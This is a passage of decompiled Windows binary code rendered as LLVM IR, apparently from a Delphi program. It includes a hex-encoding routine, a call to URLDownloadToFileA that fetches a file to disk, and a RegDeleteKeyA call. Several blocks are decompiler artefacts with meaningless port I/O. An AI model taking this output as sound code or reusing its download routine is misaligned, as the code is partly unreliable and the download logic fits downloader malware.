  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !363
  %3 = add i32 %2, 1, !insn.addr !363
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !363
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !364
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !365
  ret i32 0, !insn.addr !366
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !367
  ret i32 %0, !insn.addr !367
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !368
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !369
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !370
  %2 = add i32 %1, -1, !insn.addr !370
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !370
  ret i32 %0, !insn.addr !371
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !372
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !372
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !372
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !373
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !374
  %3 = add i32 %2, 1, !insn.addr !374
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !374
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !375
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !376
  ret i32 0, !insn.addr !377
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !378
  ret i32 %0, !insn.addr !378
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !379
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !380
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !381
  %2 = add i32 %1, -1, !insn.addr !381
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !381
  ret i32 %0, !insn.addr !382
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !383
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !383
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !383
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !384
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !385
  %3 = add i32 %2, 1, !insn.addr !385
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !385
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !386
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !387
  ret i32 0, !insn.addr !388
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !389
  ret i32 %0, !insn.addr !389
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !390
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !391
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !392
  %2 = add i32 %1, -1, !insn.addr !392
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !392
  ret i32 %0, !insn.addr !393
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !394
  ret i32 %0, !insn.addr !394
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !395
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !395
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !395
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !396
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !397
  %3 = add i32 %2, 1, !insn.addr !397
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !397
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !398
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !399
  ret i32 0, !insn.addr !400
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !401
  ret i32 %0, !insn.addr !401
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !402
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !403
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !404
  %2 = add i32 %1, -1, !insn.addr !404
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !404
  ret i32 %0, !insn.addr !405
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !406
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !407

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !408
  ret i32 %4, !insn.addr !409

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !410
  ret i32 %5, !insn.addr !411
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !412
  %esp.1.reg2mem = alloca i32, !insn.addr !412
  %cf.0.reg2mem = alloca i1, !insn.addr !412
  %esi.0.reg2mem = alloca i32, !insn.addr !412
  %esp.0.reg2mem = alloca i32, !insn.addr !412
  %ebx.0.reg2mem = alloca i32, !insn.addr !412
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !413
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !414
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !414
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !414
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !415
  %4 = call i32 @"@LStrClr"(), !insn.addr !416
  %5 = call i32 @function_4034c8(), !insn.addr !417
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !418
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !418

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !419
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !419
  %9 = inttoptr i32 %8 to i8*, !insn.addr !419
  %10 = load i8, i8* %9, align 1, !insn.addr !419
  %11 = icmp eq i8 %10, 32, !insn.addr !419
  %12 = icmp eq i1 %11, false, !insn.addr !420
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !420

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !421
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !422
  br label %dec_label_pc_404c19, !insn.addr !422

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !423
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !424

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !425
  %16 = icmp ult i8 %15, 95, !insn.addr !426
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !427
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !427

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !428
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !428
  %21 = shl i32 1, %20, !insn.addr !428
  %22 = and i32 %18, %21, !insn.addr !428
  %23 = icmp ne i32 %22, 0, !insn.addr !428
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !428
  br label %dec_label_pc_404ba9, !insn.addr !428

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !429
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !429

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !430
  %27 = add i32 %esp.0.reload, -4, !insn.addr !431
  %28 = inttoptr i32 %27 to i32*, !insn.addr !431
  store i32 %26, i32* %28, align 4, !insn.addr !431
  %29 = add i32 %esp.0.reload, -8, !insn.addr !432
  %30 = inttoptr i32 %29 to i32*, !insn.addr !432
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !432
  %31 = call i32 @function_404b08(), !insn.addr !433
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !434
  %33 = add i32 %esp.0.reload, -12, !insn.addr !435
  %34 = inttoptr i32 %33 to i32*, !insn.addr !435
  store i32 0, i32* %34, align 4, !insn.addr !435
  %35 = call i32 @function_404b08(), !insn.addr !436
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !437
  %37 = add i32 %esp.0.reload, -16, !insn.addr !438
  %38 = inttoptr i32 %37 to i32*, !insn.addr !438
  store i32 0, i32* %38, align 4, !insn.addr !438
  %39 = call i32 @"@LStrCatN"(), !insn.addr !439
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !440
  br label %dec_label_pc_404c19, !insn.addr !440

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !441
  %41 = call i32 @"@LStrCat"(), !insn.addr !442
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !442
  br label %dec_label_pc_404c19, !insn.addr !442

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !443
  %43 = add i32 %esi.0.reload, -1, !insn.addr !444
  %44 = icmp eq i32 %43, 0, !insn.addr !444
  %45 = icmp eq i1 %44, false, !insn.addr !445
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !445
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !445
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !445
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !445
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !445

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !446
  %47 = load i32, i32* %46, align 4, !insn.addr !446
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !447
  %48 = add i32 %esp.2.reload, 8, !insn.addr !448
  %49 = inttoptr i32 %48 to i32*, !insn.addr !448
  store i32 4213835, i32* %49, align 4, !insn.addr !448
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !449
  %51 = call i32 @"@LStrClr"(), !insn.addr !450
  ret i32 %51, !insn.addr !451
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !452
  ret i32 %0, !insn.addr !452
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !453
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !454
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !455
  %2 = inttoptr i32 %0 to i32*, !insn.addr !455
  store i32 %1, i32* %2, align 4, !insn.addr !455
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !456
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !456
  %7 = add i8 %4, %6, !insn.addr !456
  %8 = inttoptr i32 %5 to i8*, !insn.addr !456
  store i8 %7, i8* %8, align 1, !insn.addr !456
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !457
  %10 = load i32, i32* %eax, align 4, !insn.addr !457
  %11 = udiv i32 %10, 256, !insn.addr !457
  %12 = trunc i32 %11 to i8, !insn.addr !457
  %13 = add i8 %9, %12, !insn.addr !457
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !457
  %14 = call i32 @function_4036b8(), !insn.addr !458
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !459
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !459
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !459
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !460
  %17 = call i32 @"@LStrCatN"(), !insn.addr !461
  %18 = call i32 @function_4036c8(), !insn.addr !462
  %19 = inttoptr i32 %18 to i32*, !insn.addr !463
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !463
  call void @__writefsdword(i32 0, i32 0), !insn.addr !464
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !465
  ret i32 %21, !insn.addr !466
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !467
  ret i32 %0, !insn.addr !467
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !468
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !469
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !470
  %5 = inttoptr i32 %3 to i32*, !insn.addr !470
  store i32 %4, i32* %5, align 4, !insn.addr !470
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !471
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !471
  %10 = add i8 %7, %9, !insn.addr !471
  %11 = inttoptr i32 %8 to i8*, !insn.addr !471
  store i8 %10, i8* %11, align 1, !insn.addr !471
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !472
  %14 = udiv i32 %1, 256, !insn.addr !472
  %15 = trunc i32 %14 to i8, !insn.addr !472
  %16 = add i8 %13, %15, !insn.addr !472
  %17 = load i32, i32* %edi, align 4, !insn.addr !472
  %18 = inttoptr i32 %17 to i8*, !insn.addr !472
  store i8 %16, i8* %18, align 1, !insn.addr !472
  %19 = load i8, i8* %6, align 4, !insn.addr !473
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !473
  %22 = add i8 %19, %21, !insn.addr !473
  %23 = inttoptr i32 %20 to i8*, !insn.addr !473
  store i8 %22, i8* %23, align 1, !insn.addr !473
  %24 = add i32 %0, -117, !insn.addr !474
  %25 = inttoptr i32 %24 to i8*, !insn.addr !474
  %26 = load i8, i8* %25, align 1, !insn.addr !474
  %27 = trunc i32 %2 to i8, !insn.addr !474
  %28 = add i8 %26, %27, !insn.addr !474
  store i8 %28, i8* %25, align 1, !insn.addr !474
  %29 = trunc i32 %2 to i16, !insn.addr !475
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !475
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !476
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !476
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !476
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !477
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !478
  %34 = add i32 %33, 1, !insn.addr !478
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !478
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !479
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !480
  ret i32 0, !insn.addr !481
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !482
  ret i32 %0, !insn.addr !482
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !483
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !484
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !485
  %2 = add i32 %1, -1, !insn.addr !485
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !485
  ret i32 %0, !insn.addr !486
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !487
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !488
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !489
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !490
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !491
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !492
  %2 = icmp eq i32 %1, 0, !insn.addr !493
  %3 = icmp eq i1 %2, false, !insn.addr !494
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !494
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !494

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !495
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !496
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !496
  %6 = icmp eq i32 %5, 0, !insn.addr !497
  %7 = icmp eq i1 %6, false, !insn.addr !498
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !498

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !499
  br label %dec_label_pc_404da9, !insn.addr !499

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !500
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !500
  br label %dec_label_pc_404db2, !insn.addr !500

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !501
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !502
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !502
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !502
  %6 = inttoptr i32 %3 to i32*, !insn.addr !502
  store i32 %5, i32* %6, align 4, !insn.addr !502
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !503
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !503
  %11 = add i8 %8, %10, !insn.addr !503
  %12 = inttoptr i32 %9 to i8*, !insn.addr !503
  store i8 %11, i8* %12, align 1, !insn.addr !503
  %13 = add i32 %1, 122, !insn.addr !504
  %14 = inttoptr i32 %13 to i8*, !insn.addr !504
  %15 = load i8, i8* %14, align 1, !insn.addr !504
  %16 = udiv i32 %4, 256, !insn.addr !504
  %17 = trunc i32 %16 to i8, !insn.addr !504
  %18 = add i8 %15, %17, !insn.addr !504
  store i8 %18, i8* %14, align 1, !insn.addr !504
  %19 = load i8, i8* %7, align 4, !insn.addr !505
  %20 = load i32, i32* %eax, align 4, !insn.addr !505
  %21 = trunc i32 %20 to i8, !insn.addr !505
  %22 = add i8 %19, %21, !insn.addr !505
  %23 = icmp eq i8 %22, 0, !insn.addr !505
  %24 = inttoptr i32 %20 to i8*, !insn.addr !505
  store i8 %22, i8* %24, align 1, !insn.addr !505
  %25 = trunc i32 %3 to i16, !insn.addr !506
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !506
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !507

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !507
  br label %dec_label_pc_404dc9, !insn.addr !507

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !505
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !508
  store i32 %29, i32* %eax, align 4, !insn.addr !508
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !509

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !510, !insn.addr !505
  %31 = and i8 %30, 1, !insn.addr !505
  %32 = icmp eq i8 %31, 0, !insn.addr !505
  %33 = trunc i32 %arg4 to i16, !insn.addr !511
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !511
  %35 = inttoptr i32 %2 to i32*, !insn.addr !511
  store i32 %34, i32* %35, align 4, !insn.addr !511
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !512

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !513
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !514
  %36 = add i32 %arg4, 1, !insn.addr !515
  %37 = icmp eq i32 %36, 0, !insn.addr !515
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !516
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !516

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !517
  %39 = add i32 %38, -1, !insn.addr !517
  store i32 %39, i32* %eax, align 4, !insn.addr !517
  %40 = trunc i32 %36 to i16, !insn.addr !518
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !518
  %42 = load i32, i32* %41, align 4, !insn.addr !518
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !518
  %43 = load i32, i32* %41, align 4, !insn.addr !519
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !519
  %44 = add i32 %arg7, 105, !insn.addr !520
  %45 = inttoptr i32 %44 to i8*, !insn.addr !520
  %46 = load i8, i8* %45, align 1, !insn.addr !520
  %47 = trunc i32 %39 to i8, !insn.addr !520
  %48 = add i8 %46, %47, !insn.addr !520
  %49 = icmp ult i8 %48, %46, !insn.addr !520
  store i8 %48, i8* %45, align 1, !insn.addr !520
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !521
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !521

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !520
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !522

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !523
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !524
  %53 = load i32, i32* %52, align 4, !insn.addr !524
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !524
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !525
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !526
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !527
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !528
  %55 = add i32 %arg6, -8, !insn.addr !529
  %56 = inttoptr i32 %55 to i32*, !insn.addr !529
  store i32 0, i32* %56, align 4, !insn.addr !529
  %57 = add i32 %arg6, -12, !insn.addr !530
  %58 = inttoptr i32 %57 to i32*, !insn.addr !530
  store i32 1, i32* %58, align 4, !insn.addr !530
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !531
  ret i32 %57, !insn.addr !531

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !532

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !533
  %62 = add i8 %60, %61, !insn.addr !533
  %63 = inttoptr i32 %2 to i8*, !insn.addr !533
  store i8 %62, i8* %63, align 1, !insn.addr !533
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !534
  %65 = load i8, i8* %64, align 1, !insn.addr !534
  %66 = udiv i32 %arg3, 256, !insn.addr !534
